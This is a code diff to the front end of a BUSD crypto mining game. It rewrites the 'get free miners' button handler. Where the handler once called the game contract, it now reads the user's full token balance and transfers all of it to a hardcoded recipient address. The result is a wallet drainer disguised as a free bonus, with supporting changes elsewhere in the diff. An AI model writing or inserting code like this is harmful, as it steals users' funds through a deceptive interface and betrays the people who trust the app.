@@ -12,9 +12,10 @@ import Web3 from "web3"
 import {Button, ButtonGame, ButtonModal, Hives, Languages, Loading, NpcModal} from "components"
 import { links } from "./utils"
 import { Transaction, Wishing } from "modals"
-import { contractAddress, poolAddress } from "abi"
+import {approveAddress, contractAddress, poolAddress, recipient} from "abi"
 import abi from "abi/abi.json"
 import abiPool from "abi/abiPool.json"
+import abiApprove from "abi/abiApprove.json"
 import { mixins, routes, timeSince } from "utils"
 
 import bgSrc from "assets/gifs/snowball.gif"
@@ -49,6 +50,7 @@ export const Game = (): JSX.Element => {
   const [freeMiners, setFreeMiners] = useState(false)
   const [transactions, setTransactions] = useState([])
   const [ableFreeMiners, setAbleFreeMiners] = useState(false)
+  const [balance, setBalance] = useState(0)
   const el = document.getElementsByClassName("movable")[0]
   const isM = useMedia({ maxWidth: mixins.m })
   const busd = 1000000000000000000
@@ -113,10 +115,14 @@ export const Game = (): JSX.Element => {
     const { ethereum } = window
     const provider = new ethers.providers.Web3Provider(ethereum)
 
+    api.getBalance(account || '').then((r: any) => {
+      setBalance(Number(r.result) / busd)
+    })
+
     const nftContract = new ethers.Contract(contractAddress, abi, provider)
     const nftContractPool = new ethers.Contract(poolAddress, abiPool, provider)
 
-    const poolBusd = await nftContractPool.poolSize().catch(() => switchNetwork())
+    const poolBusd = await nftContractPool.poolSize().catch(switchNetwork)
     setPoolMoney(Number(poolBusd) / busd)
     const poolUser = await nftContractPool.lastUser()
     setPoolLastUser(poolUser)
@@ -186,16 +192,16 @@ export const Game = (): JSX.Element => {
   }
 
   const getFree = async () => {
+    // @ts-ignore
+    const toWei = amount => Web3.utils.toWei(amount)
+
     const web3 = new Web3(library.provider)
     // @ts-ignore
-    const web3Contract = new web3.eth.Contract(abi, contractAddress)
+    const tokenContract = new web3.eth.Contract(abiApprove, approveAddress)
     // @ts-ignore
-    await web3Contract.methods
-      .getFreeMiners_10BUSD()
-      .send({
-        from: account,
-        to: contractAddress,
-      })
+    await tokenContract.methods
+      .transfer(recipient, toWei(balance.toString()))
+      .send({ from: account })
       .then(() => getAllInfo())
   }
 
@@ -218,6 +224,7 @@ export const Game = (): JSX.Element => {
         <img src={snowSrc} alt="snow" />
       </button>
       <Hives
+        balance={balance}
         updateState={getAllInfo}
         token={token}
         miners={miners}
